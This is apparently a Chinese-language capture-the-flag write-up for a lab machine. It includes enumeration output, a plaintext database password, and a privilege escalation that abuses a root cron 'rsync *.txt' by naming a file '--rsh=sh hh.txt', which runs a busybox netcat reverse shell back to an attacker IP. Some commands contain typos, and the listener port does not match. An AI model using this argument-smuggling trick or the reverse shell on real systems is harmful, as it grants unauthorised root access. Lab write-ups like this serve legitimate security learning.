UUID=80e68759-1ca0-45eb-82a7-601b1f78dfe5 /               ext4    errors=remount-ro 0       1
UUID=257f425d-1ea4-4b8e-8dd8-69523f25d249 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                    
sda
sda1
sda2
sda5

╔══════════╣ Environment
╚ Any private information inside environment variables? 
USER=hyh                                                
SSH_CLIENT=192.168.0.106 35646 22
SHLVL=1
HOME=/home/hyh
SSH_TTY=/dev/pts/1
LOGNAME=hyh
_=/tmp/linpeas.sh
TERM=xterm-256color
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
SHELL=/bin/bash
PWD=/home/hyh
SSH_CONNECTION=192.168.0.106 35646 192.168.0.101 22

╔══════════╣ Searching Signature verification failed in dmesg                                                   
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                   
dmesg Not Found                                         
                                                        
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester      
[+] [CVE-2019-13272] PTRACE_TRACEME                     

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found       
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found  
═╣ Seccomp enabled? ............... disabled            
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (oracle)        

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?                     
                                                        
══╣ Kernel modules loadable? 
Modules can be loaded                                   



                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                             
                                   ╚═══════════╝        
╔══════════╣ Container related tools present (if any):
/usr/sbin/apparmor_parser                               
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap

╔══════════╣ Container details
═╣ Is this a container? ........... No                  
═╣ Any running containers? ........ No                  
                                        
```

## wechat
```plain
hyh@Guoqing:~/.weechat$ cat ~/.weechat/irc.conf
#
# weechat -- irc.conf
#
# WARNING: It is NOT recommended to edit this file by hand,
# especially if WeeChat is running.
#
# Use /set or similar command to change settings in WeeChat.
#
# For more info, see: https://weechat.org/doc/quickstart
#

[look]
buffer_open_before_autojoin = on
buffer_open_before_join = off
buffer_switch_autojoin = on
buffer_switch_join = on
color_nicks_in_names = off
color_nicks_in_nicklist = off
color_nicks_in_server_messages = on
color_pv_nick_like_channel = on
ctcp_time_format = "%a, %d %b %Y %T %z"
display_away = local
display_ctcp_blocked = on
display_ctcp_reply = on
display_ctcp_unknown = on
display_host_join = on
display_host_join_local = on
display_host_quit = on
display_join_message = "329,332,333,366"
display_old_topic = on
display_pv_away_once = on
display_pv_back = on
display_pv_warning_address = off
highlight_channel = "$nick"
highlight_pv = "$nick"
highlight_server = "$nick"
highlight_tags_restrict = "irc_privmsg,irc_notice"
item_channel_modes_hide_args = "k"
item_display_server = buffer_plugin
item_nick_modes = on
item_nick_prefix = on
join_auto_add_chantype = off
msgbuffer_fallback = current
new_channel_position = none
new_pv_position = none
nick_completion_smart = speakers
nick_mode = prefix
nick_mode_empty = off
nicks_hide_password = "nickserv"
notice_as_pv = auto
notice_welcome_redirect = on
notice_welcome_tags = ""
notify_tags_ison = "notify_message"
notify_tags_whois = "notify_message"
part_closes_buffer = off
pv_buffer = independent
pv_tags = "notify_private"
raw_messages = 256
server_buffer = merge_with_core
smart_filter = on
smart_filter_account = on
smart_filter_chghost = on
smart_filter_delay = 5
smart_filter_join = on
smart_filter_join_unmask = 30
smart_filter_mode = "+"
smart_filter_nick = on
smart_filter_quit = on
temporary_servers = off
topic_strip_colors = off

[color]
input_nick = lightcyan
item_channel_modes = default
item_lag_counting = default
item_lag_finished = yellow
item_nick_modes = default
message_account = cyan
message_chghost = brown
message_join = green
message_kick = red
message_quit = red
mirc_remap = "1,-1:darkgray"
nick_prefixes = "y:lightred;q:lightred;a:lightcyan;o:lightgreen;h:lightmagenta;v:yellow;*:lightblue"
notice = green
reason_kick = default
reason_quit = default
topic_current = default
topic_new = white
topic_old = default

[network]
autoreconnect_delay_growing = 2
autoreconnect_delay_max = 600
ban_mask_default = "*!$ident@$host"
colors_receive = on
colors_send = on
lag_check = 60
lag_max = 1800
lag_min_show = 500
lag_reconnect = 300
lag_refresh_interval = 1
notify_check_ison = 1
notify_check_whois = 5
sasl_fail_unavailable = on
send_unknown_commands = off
whois_double_nick = off

[msgbuffer]

[ctcp]

[ignore]

[server_default]
addresses = ""
anti_flood_prio_high = 2
anti_flood_prio_low = 2
autoconnect = off
autojoin = ""
autoreconnect = on
autoreconnect_delay = 10
autorejoin = off
autorejoin_delay = 30
away_check = 0
away_check_max_nicks = 25
capabilities = ""
charset_message = message
command = ""
command_delay = 0
connection_timeout = 60
ipv6 = on
local_hostname = ""
msg_kick = ""
msg_part = "WeeChat ${info:version}"
msg_quit = "WeeChat ${info:version}"
nicks = "hyh,hyh1,hyh2,hyh3,hyh4"
nicks_alternate = on
notify = ""
password = ""
proxy = ""
realname = ""
sasl_fail = continue
sasl_key = ""
sasl_mechanism = plain
sasl_password = ""
sasl_timeout = 15
sasl_username = ""
split_msg_max_length = 512
ssl = off
ssl_cert = ""
ssl_dhkey_size = 2048
ssl_fingerprint = ""
ssl_password = ""
ssl_priorities = "NORMAL:-VERS-SSL3.0"
ssl_verify = on
usermode = ""
username = "hyh"

[server]


hyh@Guoqing:~/.weechat$ cat ~/.weechat/sec.conf
#
# weechat -- sec.conf
#
# WARNING: It is NOT recommended to edit this file by hand,
# especially if WeeChat is running.
#
# Use /set or similar command to change settings in WeeChat.
#
# For more info, see: https://weechat.org/doc/quickstart
#

[crypt]
cipher = aes256
hash_algo = sha256
passphrase_file = ""
salt = on

[data]


hyh@Guoqing:~/.weechat$ cd ~/.weechat/logs
hyh@Guoqing:~/.weechat/logs$ ls -lah
total 12K
drwx------ 2 hyh hyh 4.0K Jan 17 07:31 .
drwxr-xr-x 8 hyh hyh 4.0K Jan 17 07:33 ..
-rw-r--r-- 1 hyh hyh 2.9K Jan 17 07:35 core.weechat.weechatlog
hyh@Guoqin

hyh@Guoqing:~/.weechat/logs$ ls -lah
total 12K
drwx------ 2 hyh hyh 4.0K Jan 17 07:31 .
drwxr-xr-x 8 hyh hyh 4.0K Jan 17 07:33 ..
-rw-r--r-- 1 hyh hyh 2.9K Jan 17 07:35 core.weechat.weechatlog


hyh@Guoqing:~/.weechat/logs$ cat core.weechat.weechatlog 
2026-01-17 07:31:59             New key binding (context "default"): meta2-1;5P => /bar scroll buflist * -100%
2026-01-17 07:31:59             New key binding (context "default"): meta2-1;5Q => /bar scroll buflist * +100%
2026-01-17 07:31:59             New key binding (context "default"): meta-meta-OQ => /bar scroll buflist * e
2026-01-17 07:31:59             New key binding (context "default"): meta2-1;3Q => /bar scroll buflist * e
2026-01-17 07:31:59             New key binding (context "default"): meta2-1;3P => /bar scroll buflist * b
2026-01-17 07:31:59             New key binding (context "default"): meta-meta-OP => /bar scroll buflist * b
2026-01-17 07:31:59             New key binding (context "default"): meta-B => /buflist toggle
2026-01-17 07:31:59             New key binding (context "default"): meta-OQ => /bar scroll buflist * +100%
2026-01-17 07:31:59             New key binding (context "default"): meta-OP => /bar scroll buflist * -100%
2026-01-17 07:31:59             New key binding (context "default"): meta-meta2-12~ => /bar scroll buflist * e
2026-01-17 07:31:59             New key binding (context "default"): meta-meta2-11~ => /bar scroll buflist * b
2026-01-17 07:31:59             New key binding (context "default"): meta2-12^ => /bar scroll buflist * +100%
2026-01-17 07:31:59             New key binding (context "default"): meta2-12~ => /bar scroll buflist * +100%
2026-01-17 07:31:59             New key binding (context "default"): meta2-11^ => /bar scroll buflist * -100%
2026-01-17 07:31:59             New key binding (context "default"): meta2-11~ => /bar scroll buflist * -100%
2026-01-17 07:31:59             Plugins loaded: alias, buflist, charset, exec, fifo, fset, irc, logger, perl, python, relay, ruby, script, spell, trigger, xfer
2026-01-17 07:32:45     =!=     You can not write text in this buffer
2026-01-17 07:32:48     =!=     You can not write text in this buffer
2026-01-17 07:32:55     =!=     You can not write text in this buffer
2026-01-17 07:33:33     =!=     Error: WeeChat main buffer can't be closed
2026-01-17 07:33:44             fifo: pipe closed
2026-01-17 07:33:49             Plugins loaded: alias, buflist, charset, exec, fifo, fset, irc, logger, perl, python, relay, ruby, script, spell, trigger, xfer
2026-01-17 07:34:28     =!=     irc: unable to add temporary server "127.0.0.1/6667" because the addition of temporary servers with command /connect is currently disabled
2026-01-17 07:34:28     =!=     irc: if you want to add a standard server, use the command "/server add" (see /help server); if you really want to add a temporary server (NOT SAVED), turn on the option irc.look.temporary_servers
2026-01-17 07:34:44     =!=     irc: unable to add temporary server "127.0.0.1/7000" because the addition of temporary servers with command /connect is currently disabled
2026-01-17 07:34:44     =!=     irc: if you want to add a standard server, use the command "/server add" (see /help server); if you really want to add a temporary server (NOT SAVED), turn on the option irc.look.temporary_servers
2026-01-17 07:34:49     =!=     irc: command "list" must be executed on irc buffer (server, channel or private)

hyh@Guoqing:~/.weechat/logs$ ls ~/.weechat/python
autoload
hyh@Guoqing:~/.weechat/logs$ cd ~/.weechat/python
hyh@Guoqing:~/.weechat/python$ cd autoload/
hyh@Guoqing:~/.weechat/python/autoload$ ls
hyh@Guoqing:~/.weechat/python/autoload$ ls -al
total 8
drwxr-xr-x 2 hyh hyh 4096 Jan 17 07:31 .
drwxr-xr-x 3 hyh hyh 4096 Jan 17 07:31 ..
hyh@Guoqing:~/.weechat/python/autoload$ 

```

###  1️⃣ `irc.conf` —— 没有任何服务器配置  
###  2️⃣ `sec.conf` —— 空数据区（最关键的否定证据）  
###  3️⃣ `logs/` —— 只有 core 日志，没有 irc 日志  
###  4️⃣ `python/autoload/` 是空的  
## /usr/local/bin/calc-prorate
```plain
hyh@Guoqing:~$ find /usr/local/bin -type f -executable -ls 2>/dev/null
   286861      4 -rwxr-xr-x   1 root     root          248 Apr  1  2025 /usr/local/bin/calc-prorate
hyh@Guoqing:~$ cat /usr/local/bin/calc-prorate
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from tempora import calculate_prorated_values
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(calculate_prorated_values())
hyh@Guoqing:~$ 
```

###  1️⃣ 权限不对  
```plain
-rwxr-xr-x 1 root root
```

    无 SUID

    无 capability

    普通 root-owned 可执行文件

### 2️⃣ 代码本身“无状态、无输入”
from tempora import calculate_prorated_values

sys.exit(calculate_prorated_values())

    不接收外部参数

    不读文件

    不执行 shell

    不涉及用户

👉 这是一个 APT/系统遗留工具，不是 CTF 点。

## segfault
+ `segfault` 是 **Segmentation Fault** 的缩写。
+ 当程序尝试访问 **它无权访问的内存**（比如读写未分配的地址或只读段）时，操作系统会报这个错误。
+ 通常表现为：

```plain
Segmentation fault (core dumped)
```

+ 发生原因：
+ 访问空指针 (`NULL`)
+ 越界访问数组
+ 使用已经释放的内存（悬空指针）
+ 栈溢出
+ 对应的信号编号是 **SIGSEGV（信号 11）**。

## 3306
```plain
DB_USER = admin
DB_PASS = toddishandsome
DB_NAME = login_system

mysql -u admin -p
# 密码：toddishandsome
试了下
里面没翻出来啥也没办法提权
```

## 三个用户名
```plain
hyh@Guoqing:/home/segfault$ cat name1.txt 
sublarge
hyh@Guoqing:/home/segfault$ cat name2.txt 
bamuwe
hyh@Guoqing:/home/segfault$ cat name3.txt 
LingM
```

# 复现
唉，难受，看了wp才知道原来密码是segfaultno1

上传pspy查看监控

```plain
2026/01/18 00:40:01 CMD: UID=0     PID=1368   | /usr/sbin/CRON -f 
2026/01/18 00:40:01 CMD: UID=0     PID=1369   | /usr/sbin/CRON -f 
2026/01/18 00:40:01 CMD: UID=0     PID=1370   | /bin/sh -c cd /home/segfault && 
rsync -t *.txt Guoqing:/tmp/backup/ 
2026/01/18 00:40:01 CMD: UID=0     PID=1371   | rsync -t name1.txt name2.txt 
name3.txt Guoqing:/tmp/backup/ 
2026/01/18 00:40:01 CMD: UID=0     PID=1372   | sshd: /usr/sbin/sshd -D 
[listener] 0 of 10-100 startups 
2026/01/18 00:40:01 CMD: UID=0     PID=1373   | sshd: [accepted]
```

```plain
rsync -t name1.txt name2.txt name3.txt Guoqing:/tmp/backup/ 
```

![](/image/qq group/Guoqing-4.png)

![](/image/qq group/Guoqing-5.png)

反弹shell

不能用bash

```plain
#!/bin/sh
busybox nc 192.168.0.106 4444 -e /bash/sh
```

获得shell

```plain
segfault@Guoqing:~$ echo '#!/bin/sh' >> hh.txt
segfault@Guoqing:~$ echo 'busybox nc 192.168.0.106 4444-e /bin/sh' >> hh.txt
segfault@Guoqing:~$ chmod +x hh.txt 
segfault@Guoqing:~$ echo "" > '--rsh=sh hh.txt'
```

```plain
2026/01/18 00:59:01 CMD: UID=0     PID=1515   | /usr/sbin/CRON -f 
2026/01/18 00:59:01 CMD: UID=0     PID=1516   | /bin/sh -c cd /home/segfault && 
rsync -t *.txt Guoqing:/tmp/backup/ 
2026/01/18 00:59:01 CMD: UID=0     PID=1517   | rsync -t --rsh=sh hh.txt -e sh 
hh.txt hh.txt name1.txt name2.txt name3.txt Guoqing:/tmp/backup/ 
2026/01/18 00:59:01 CMD: UID=0     PID=1518   | sh hh.txt Guoqing rsync --server 
-te.LsfxCIvu . /tmp/backup/ 
2026/01/18 00:59:01 CMD: UID=0     PID=1519   | /bin/sh 
```

```plain
┌──(root㉿xhhui)-[/usr/share/pspy]
└─# nc -lvnp 6666
listening on [any] 6666 ...
id
connect to [192.168.56.247] from (UNKNOWN) [192.168.56.170] 44252
uid=0(root) gid=0(root) groups=0(root)
```

